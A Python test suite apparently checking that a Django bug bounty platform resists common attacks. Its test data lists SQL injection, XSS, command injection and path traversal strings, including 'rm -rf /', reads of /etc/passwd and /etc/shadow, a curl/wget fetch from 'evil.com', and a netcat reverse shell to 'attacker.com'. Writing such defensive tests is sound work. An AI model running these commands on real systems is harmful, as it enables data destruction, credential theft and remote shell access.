"""
Security tests for Bug Bounty Automation Platform

These tests ensure the platform itself is secure and follows security best practices.
"""

import pytest
import re
import json
from unittest.mock import Mock, patch
from django.test import TestCase, TransactionTestCase
from django.contrib.auth import get_user_model
from django.core.exceptions import ValidationError
from rest_framework.test import APIClient
from rest_framework_simplejwt.tokens import RefreshToken

from apps.targets.models import Target
from apps.scanning.models import ScanSession
from apps.vulnerabilities.models import Vulnerability
from apps.exploitation.models import ExploitationSession

from tests.factories import UserFactory, TargetFactory, ScanSessionFactory

User = get_user_model()


@pytest.mark.security
@pytest.mark.django_db
class TestAuthenticationSecurity(TestCase):
    """Test authentication security measures"""

    def setUp(self):
        self.client = APIClient()
        self.user = UserFactory()

    def test_jwt_token_security(self):
        """Test JWT token security implementation"""

        # Generate JWT token
        refresh = RefreshToken.for_user(self.user)
        access_token = str(refresh.access_token)

        # Verify token structure and security
        token_parts = access_token.split('.')
        self.assertEqual(len(token_parts), 3, "JWT should have 3 parts")

        # Decode header to check algorithm
        import base64
        header = json.loads(base64.b64decode(token_parts[0] + '=='))
        self.assertIn('alg', header)
        self.assertNotEqual(header['alg'], 'none', "JWT algorithm should not be 'none'")

    def test_password_strength_validation(self):
        """Test password strength requirements"""

        weak_passwords = [
            'password',
            '123456',
            'qwerty',
            'admin',
            'abc123',
            'short'  # Too short
        ]

        for weak_password in weak_passwords:
            with self.assertRaises(ValidationError):
                user = User(
                    username='testuser',
                    email='test@example.com'
                )
                user.set_password(weak_password)
                user.full_clean()

    def test_authentication_rate_limiting(self):
        """Test authentication rate limiting"""

        # Attempt multiple failed logins
        for i in range(10):
            response = self.client.post('/api/auth/login/', {
                'username': 'nonexistent',
                'password': 'wrongpassword'
            })

        # Should eventually be rate limited
        final_response = self.client.post('/api/auth/login/', {
            'username': 'nonexistent',
            'password': 'wrongpassword'
        })

        # Check for rate limiting response
        self.assertIn(final_response.status_code, [429, 403])  # Too Many Requests or Forbidden

    def test_session_security(self):
        """Test session security configuration"""

        # Authenticate user
        refresh = RefreshToken.for_user(self.user)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')

        # Make authenticated request
        response = self.client.get('/api/targets/')
        self.assertEqual(response.status_code, 200)

        # Clear credentials
        self.client.credentials()

        # Request should fail without authentication
        response = self.client.get('/api/targets/')
        self.assertEqual(response.status_code, 401)


@pytest.mark.security
@pytest.mark.django_db
class TestAuthorizationSecurity(TestCase):
    """Test authorization and access control security"""

    def setUp(self):
        self.client = APIClient()
        self.regular_user = UserFactory()
        self.admin_user = UserFactory(is_staff=True, is_superuser=True)
        self.other_user = UserFactory()

    def authenticate_user(self, user):
        """Helper to authenticate a user"""
        refresh = RefreshToken.for_user(user)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')

    def test_user_data_isolation(self):
        """Test that users can only access their own data"""

        # Create targets for different users
        user1_target = TargetFactory(created_by=self.regular_user)
        user2_target = TargetFactory(created_by=self.other_user)

        # Authenticate as user1
        self.authenticate_user(self.regular_user)

        # User1 should see their own target
        response = self.client.get(f'/api/targets/{user1_target.id}/')
        self.assertEqual(response.status_code, 200)

        # User1 should NOT see user2's target
        response = self.client.get(f'/api/targets/{user2_target.id}/')
        self.assertEqual(response.status_code, 404)

    def test_admin_privilege_escalation_protection(self):
        """Test protection against privilege escalation"""

        # Regular user should not be able to create admin users
        self.authenticate_user(self.regular_user)

        admin_user_data = {
            'username': 'newadmin',
            'email': 'admin@test.com',
            'password': 'securepassword123',
            'is_staff': True,
            'is_superuser': True
        }

        response = self.client.post('/api/users/', admin_user_data)

        # Should either fail or strip admin privileges
        if response.status_code == 201:
            created_user = User.objects.get(username='newadmin')
            self.assertFalse(created_user.is_staff)
            self.assertFalse(created_user.is_superuser)

    def test_scan_execution_authorization(self):
        """Test scan execution requires proper authorization"""

        target = TargetFactory(created_by=self.other_user)

        # Authenticate as regular user (not owner)
        self.authenticate_user(self.regular_user)

        # Should not be able to start scan on another user's target
        scan_data = {
            'target_id': target.id,
            'session_name': 'Unauthorized Scan'
        }

        response = self.client.post('/api/scanning/', scan_data)
        self.assertIn(response.status_code, [403, 404])

    def test_exploitation_access_control(self):
        """Test exploitation requires proper access control"""

        # Create vulnerability owned by another user
        other_user_target = TargetFactory(created_by=self.other_user)
        other_user_scan = ScanSessionFactory(target=other_user_target)
        vulnerability = VulnerabilityFactory(scan_session=other_user_scan)

        # Authenticate as regular user
        self.authenticate_user(self.regular_user)

        # Should not be able to exploit another user's vulnerability
        exploit_data = {
            'vulnerability_id': vulnerability.id,
            'target_id': other_user_target.id,
            'exploitation_type': 'sql_injection'
        }

        response = self.client.post('/api/exploitation/', exploit_data)
        self.assertIn(response.status_code, [403, 404])


@pytest.mark.security
@pytest.mark.django_db
class TestInputValidationSecurity(TestCase):
    """Test input validation and sanitization security"""

    def setUp(self):
        self.client = APIClient()
        self.user = UserFactory()
        refresh = RefreshToken.for_user(self.user)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')

    def test_sql_injection_protection(self):
        """Test protection against SQL injection in API inputs"""

        sql_injection_payloads = [
            "'; DROP TABLE targets; --",
            "' OR 1=1 --",
            "' UNION SELECT * FROM users --",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]

        for payload in sql_injection_payloads:
            target_data = {
                'target_name': payload,
                'platform': 'hackerone',
                'researcher_username': 'test',
                'main_url': 'https://example.com'
            }

            response = self.client.post('/api/targets/', target_data)

            # Should either reject malicious input or sanitize it
            if response.status_code == 201:
                created_target = Target.objects.get(id=response.data['id'])
                # Target name should be sanitized
                self.assertNotIn('DROP TABLE', created_target.target_name)
                self.assertNotIn('UNION SELECT', created_target.target_name)

    def test_xss_protection(self):
        """Test protection against XSS in API inputs"""

        xss_payloads = [
            '<script>alert("XSS")</script>',
            '<img src=x onerror=alert("XSS")>',
            'javascript:alert("XSS")',
            '<svg onload=alert("XSS")>',
            '<iframe src="javascript:alert(\'XSS\')"></iframe>'
        ]

        for payload in xss_payloads:
            target_data = {
                'target_name': f'Test Target {payload}',
                'platform': 'hackerone',
                'researcher_username': 'test',
                'main_url': 'https://example.com'
            }

            response = self.client.post('/api/targets/', target_data)

            if response.status_code == 201:
                created_target = Target.objects.get(id=response.data['id'])
                # XSS payload should be sanitized
                self.assertNotIn('<script>', created_target.target_name)
                self.assertNotIn('javascript:', created_target.target_name)
                self.assertNotIn('onerror=', created_target.target_name)

    def test_command_injection_protection(self):
        """Test protection against command injection"""

        command_injection_payloads = [
            '; ls -la',
            '| cat /etc/passwd',
            '&& rm -rf /',
            '`whoami`',
            '$(cat /etc/hosts)'
        ]

        for payload in command_injection_payloads:
            scan_data = {
                'session_name': f'Test Scan {payload}',
                'scan_config': {
                    'custom_parameters': payload
                }
            }

            response = self.client.post('/api/scanning/', scan_data)

            # System should reject or sanitize command injection attempts
            if response.status_code == 201:
                scan_session = ScanSession.objects.get(id=response.data['id'])
                scan_config = scan_session.scan_config
                if 'custom_parameters' in scan_config:
                    # Should not contain shell metacharacters
                    self.assertNotIn(';', scan_config['custom_parameters'])
                    self.assertNotIn('|', scan_config['custom_parameters'])
                    self.assertNotIn('&', scan_config['custom_parameters'])

    def test_path_traversal_protection(self):
        """Test protection against path traversal attacks"""

        path_traversal_payloads = [
            '../../../etc/passwd',
            '..\\..\\..\\windows\\system32\\config\\sam',
            '/etc/passwd',
            'C:\\windows\\system32\\drivers\\etc\\hosts',
            '....//....//....//etc/passwd'
        ]

        for payload in path_traversal_payloads:
            # Test file upload paths
            target_data = {
                'target_name': 'Test Target',
                'platform': 'hackerone',
                'researcher_username': 'test',
                'main_url': 'https://example.com',
                'evidence_file_path': payload
            }

            response = self.client.post('/api/targets/', target_data)

            # Should reject path traversal attempts
            if response.status_code == 201:
                created_target = Target.objects.get(id=response.data['id'])
                if hasattr(created_target, 'evidence_file_path'):
                    # Path should be sanitized
                    self.assertNotIn('..', created_target.evidence_file_path)
                    self.assertNotIn('/etc/', created_target.evidence_file_path)


@pytest.mark.security
@pytest.mark.django_db
class TestDataProtectionSecurity(TestCase):
    """Test data protection and privacy security"""

    def setUp(self):
        self.client = APIClient()
        self.user = UserFactory()
        refresh = RefreshToken.for_user(self.user)
        self.client.credentials(HTTP_AUTHORIZATION=f'Bearer {refresh.access_token}')

    def test_sensitive_data_exposure_protection(self):
        """Test protection against sensitive data exposure"""

        # Create vulnerability with sensitive data
        scan_session = ScanSessionFactory()
        vulnerability = VulnerabilityFactory(
            scan_session=scan_session,
            payload_used="password=secretpassword&token=abc123",
            evidence_data={
                'response': 'Authentication successful',
                'extracted_data': ['admin', 'password123', 'api_key_xyz']
            }
        )

        response = self.client.get(f'/api/vulnerabilities/{vulnerability.id}/')
        self.assertEqual(response.status_code, 200)

        # Sensitive data should be masked or removed
        response_content = json.dumps(response.data)

        # Check for common sensitive patterns
        sensitive_patterns = [
            r'password\s*=\s*["\']?[\w]+["\']?',
            r'api[_-]?key\s*=\s*["\']?[\w]+["\']?',
            r'token\s*=\s*["\']?[\w]+["\']?',
            r'secret\s*=\s*["\']?[\w]+["\']?'
        ]

        for pattern in sensitive_patterns:
            matches = re.findall(pattern, response_content, re.IGNORECASE)
            # Sensitive data should be masked (e.g., "password=****")
            for match in matches:
                self.assertIn('*', match, f"Sensitive data not masked: {match}")

    def test_log_sanitization(self):
        """Test that logs don't contain sensitive information"""

        import logging
        from io import StringIO

        # Capture log output
        log_stream = StringIO()
        handler = logging.StreamHandler(log_stream)
        logger = logging.getLogger('django')
        logger.addHandler(handler)
        logger.setLevel(logging.DEBUG)

        # Perform action that might log sensitive data
        target_data = {
            'target_name': 'Test Target',
            'platform': 'hackerone',
            'researcher_username': 'test',
            'main_url': 'https://example.com',
            'api_key': 'secret_api_key_12345'
        }

        response = self.client.post('/api/targets/', target_data)

        # Check log content
        log_content = log_stream.getvalue()

        # Sensitive data should not appear in logs
        self.assertNotIn('secret_api_key_12345', log_content)
        self.assertNotIn('password', log_content.lower())

        logger.removeHandler(handler)

    def test_data_encryption_at_rest(self):
        """Test that sensitive data is encrypted at rest"""

        # Create vulnerability with sensitive payload
        scan_session = ScanSessionFactory()
        sensitive_payload = "admin'; DROP TABLE users; --"

        vulnerability = VulnerabilityFactory(
            scan_session=scan_session,
            payload_used=sensitive_payload
        )

        # Check that data is encrypted in database
        from django.db import connection
        with connection.cursor() as cursor:
            cursor.execute(
                "SELECT payload_used FROM vulnerabilities_vulnerability WHERE id = %s",
                [vulnerability.id]
            )
            row = cursor.fetchone()

            if row:
                stored_payload = row[0]
                # If encryption is implemented, stored data should not match plaintext
                # This test assumes encryption is implemented; adjust based on actual implementation
                if hasattr(vulnerability._meta.get_field('payload_used'), 'encrypted'):
                    self.assertNotEqual(stored_payload, sensitive_payload)


@pytest.mark.security
@pytest.mark.django_db
class TestSecurityHeaders(TestCase):
    """Test security headers in HTTP responses"""

    def setUp(self):
        self.client = APIClient()

    def test_security_headers_present(self):
        """Test that proper security headers are present"""

        response = self.client.get('/api/')

        # Check for security headers
        security_headers = [
            'X-Content-Type-Options',
            'X-Frame-Options',
            'X-XSS-Protection',
            'Strict-Transport-Security',
            'Content-Security-Policy'
        ]

        for header in security_headers:
            self.assertIn(header, response.headers,
                         f"Security header {header} not found")

        # Check header values
        self.assertEqual(response.headers.get('X-Content-Type-Options'), 'nosniff')
        self.assertEqual(response.headers.get('X-Frame-Options'), 'DENY')

    def test_cors_configuration(self):
        """Test CORS configuration security"""

        # Make OPTIONS request to check CORS
        response = self.client.options('/api/targets/')

        cors_headers = response.headers

        # CORS should be restrictive
        if 'Access-Control-Allow-Origin' in cors_headers:
            allowed_origin = cors_headers['Access-Control-Allow-Origin']
            # Should not allow all origins
            self.assertNotEqual(allowed_origin, '*')

        # Check allowed methods are reasonable
        if 'Access-Control-Allow-Methods' in cors_headers:
            allowed_methods = cors_headers['Access-Control-Allow-Methods']
            dangerous_methods = ['TRACE', 'CONNECT']
            for method in dangerous_methods:
                self.assertNotIn(method, allowed_methods)


@pytest.mark.security
@pytest.mark.django_db
class TestSecureConfigurationSecurity(TestCase):
    """Test secure configuration practices"""

    def test_debug_mode_disabled(self):
        """Test that DEBUG mode is disabled in production"""

        from django.conf import settings

        # In production, DEBUG should be False
        if hasattr(settings, 'DEBUG'):
            # This test should pass in production environments
            # For testing environments, we skip this assertion
            import os
            if os.environ.get('DJANGO_ENV') == 'production':
                self.assertFalse(settings.DEBUG)

    def test_secret_key_security(self):
        """Test that SECRET_KEY is properly configured"""

        from django.conf import settings

        # SECRET_KEY should exist and be complex
        self.assertTrue(hasattr(settings, 'SECRET_KEY'))
        self.assertGreater(len(settings.SECRET_KEY), 30)

        # Should not be a default or weak key
        weak_keys = [
            'django-insecure-',
            'your-secret-key-here',
            'changeme',
            '1234567890'
        ]

        for weak_key in weak_keys:
            self.assertNotIn(weak_key, settings.SECRET_KEY.lower())

    def test_allowed_hosts_configuration(self):
        """Test ALLOWED_HOSTS configuration"""

        from django.conf import settings

        if hasattr(settings, 'ALLOWED_HOSTS'):
            # Should not allow all hosts
            self.assertNotIn('*', settings.ALLOWED_HOSTS)

    def test_database_credentials_security(self):
        """Test database credentials are not hardcoded"""

        from django.conf import settings

        if hasattr(settings, 'DATABASES'):
            default_db = settings.DATABASES.get('default', {})

            # Check for environment variable usage
            password = default_db.get('PASSWORD', '')
            if password:
                # Password should not be obviously hardcoded
                weak_passwords = ['password', '123456', 'admin', 'root']
                self.assertNotIn(password.lower(), weak_passwords)


@pytest.mark.security
class TestScanToolSecurity:
    """Test security of scanning tools and payloads"""

    def test_payload_sanitization(self):
        """Test that scan payloads are properly sanitized"""

        dangerous_payloads = [
            'rm -rf /',
            'format c:',
            '$(curl evil.com)',
            '`wget malware.com/payload`',
            '; nc -e /bin/sh attacker.com 4444'
        ]

        from services.vulnerability_scanner import VulnerabilityScanner
        scanner = VulnerabilityScanner()

        for payload in dangerous_payloads:
            # Payloads should be sanitized before execution
            sanitized = scanner.sanitize_payload(payload)

            # Should remove dangerous characters/commands
            self.assertNotIn('rm -rf', sanitized)
            self.assertNotIn('format c:', sanitized)
            self.assertNotIn('$(', sanitized)
            self.assertNotIn('`', sanitized)
            self.assertNotIn(';', sanitized)

    def test_command_execution_security(self):
        """Test that external command execution is secure"""

        from services.scanner_engines.nuclei_engine import NucleiEngine

        nuclei = NucleiEngine()

        # Test with malicious input
        malicious_target = "example.com; rm -rf /"

        # Command construction should prevent injection
        command = nuclei.build_nuclei_command(
            target_url=malicious_target,
            template_paths=[],
            output_file="/tmp/test"
        )

        # Command should be properly escaped
        command_str = ' '.join(command)
        self.assertNotIn('; rm -rf /', command_str)
        self.assertIn('example.com', command_str)

    def test_file_path_validation(self):
        """Test file path validation in scan results"""

        from services.vulnerability_scanner import VulnerabilityScanner

        scanner = VulnerabilityScanner()

        dangerous_paths = [
            '../../../etc/passwd',
            '/etc/shadow',
            'C:\\windows\\system32\\config\\sam',
            '/proc/self/environ'
        ]

        for path in dangerous_paths:
            # Should validate and reject dangerous paths
            is_valid = scanner.validate_file_path(path)
            self.assertFalse(is_valid, f"Dangerous path allowed: {path}")

    @patch('subprocess.run')
    def test_tool_execution_isolation(self, mock_subprocess):
        """Test that scanning tools run in isolated environment"""

        mock_subprocess.return_value.returncode = 0
        mock_subprocess.return_value.stdout = "test output"
        mock_subprocess.return_value.stderr = ""

        from services.scanner_engines.nuclei_engine import NucleiEngine

        nuclei = NucleiEngine()
        result = nuclei.execute_scan(
            target_url="https://example.com",
            scan_session_id=1
        )

        # Verify subprocess was called with proper isolation
        mock_subprocess.assert_called_once()
        call_args = mock_subprocess.call_args

        # Should use proper process isolation
        if 'env' in call_args.kwargs:
            env = call_args.kwargs['env']
            # Sensitive environment variables should be filtered
            sensitive_vars = ['AWS_SECRET_KEY', 'DB_PASSWORD', 'SECRET_KEY']
            for var in sensitive_vars:
                self.assertNotIn(var, env.keys())